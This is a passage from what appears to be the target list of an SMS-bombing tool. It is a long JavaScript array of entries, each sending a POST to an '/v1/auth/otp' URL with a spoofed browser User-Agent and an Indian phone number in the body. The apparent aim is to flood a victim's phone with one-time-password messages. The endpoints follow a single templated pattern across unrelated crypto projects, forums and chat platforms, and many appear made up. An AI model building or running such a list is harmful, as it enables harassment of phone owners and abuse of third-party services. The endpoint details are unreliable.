        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Privy_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.privy.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'WalletConnect_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.walletconnect.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'EIP_4361_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.eip4361.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'ENS_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.ens.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'IPFS_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.ipfs.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Filecoin_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.filecoin.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Arweave_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.arweave.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Storj_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.storj.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Sia_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.sia.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Golem_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.golem.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Render_Network_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.render.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Livepeer_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.livepeer.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Theta_Network_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.theta.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'VeChain_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.vechain.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'IOTA_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.iota.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Hedera_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.hedera.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Algorand_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.algorand.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Avalanche_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.avalanche.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Solana_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.solana.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Polygon_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.polygon.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Cardano_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.cardano.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Polkadot_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.polkadot.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Kusama_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.kusama.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Near_Protocol_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.near.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Cosmos_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.cosmos.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Tezos_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.tezos.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'EOS_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.eos.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'TRON_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.tron.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'NEO_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.neo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'NEM_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.nem.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'IOST_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.iost.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Zilliqa_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.zilliqa.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Ontology_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.ontology.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Waves_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.waves.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Elrond_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.elrond.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Harmony_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.harmony.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Celo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.celo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Flow_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.flow.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Aptos_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.aptos.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Sui_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.sui.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Sei_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.sei.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Injective_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.injective.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Osmosis_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.osmosis.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Juno_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.juno.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Evmos_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.evmos.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Cronos_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.cronos.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Fantom_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.fantom.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Moonbeam_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.moonbeam.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Moonriver_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.moonriver.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Astar_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.astar.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Shiden_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.shiden.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Kava_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.kava.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Band_Protocol_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bandprotocol.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Chainlink_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.chainlink.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'API3_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.api3.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Theta_Fuel_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.thetafuel.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'IoTeX_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.iotex.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Helium_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.helium.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Filebase_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.filebase.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Spheron_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.spheron.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Akash_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.akash.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Cudos_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.cudos.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Fetch_AI_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.fetch.ai/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SingularityNET_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.singularitynet.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Ocean_Protocol_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.oceanprotocol.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Covalent_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.covalent.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'TheGraph_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.thegraph.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Subgraph_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.subgraph.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Ceramic_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.ceramic.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Textile_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.textile.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'OrbitDB_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.orbitdb.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Pinata_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.pinata.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'NFT_Storage_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.nft.storage/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Web3_Storage_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.web3.storage/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Estuary_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.estuary.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Fleek_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.fleek.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Ceramic_Network_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.ceramicnetwork.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': '3Box_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.3box.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Spruce_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.spruce.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'IDX_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.idx.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Orbis_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.orbis.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Crossbell_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.crossbell.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Lens_Protocol_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.lensprotocol.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Farcaster_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.farcaster.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Orbit_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.orbit.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'DeSo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.deso.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Minds_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.minds.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Gun_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.gun.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SecureScuttlebutt_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.scuttlebutt.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Matrix_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.matrix.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'RocketChat_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.rocketchat.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Zulip_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.zulip.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Mattermost_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.mattermost.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Discourse_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.discourse.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Flarum_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.flarum.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Vanilla_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.vanilla.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Xenforo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.xenforo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'PhpBB_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.phpbb.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'MyBB_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.mybb.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
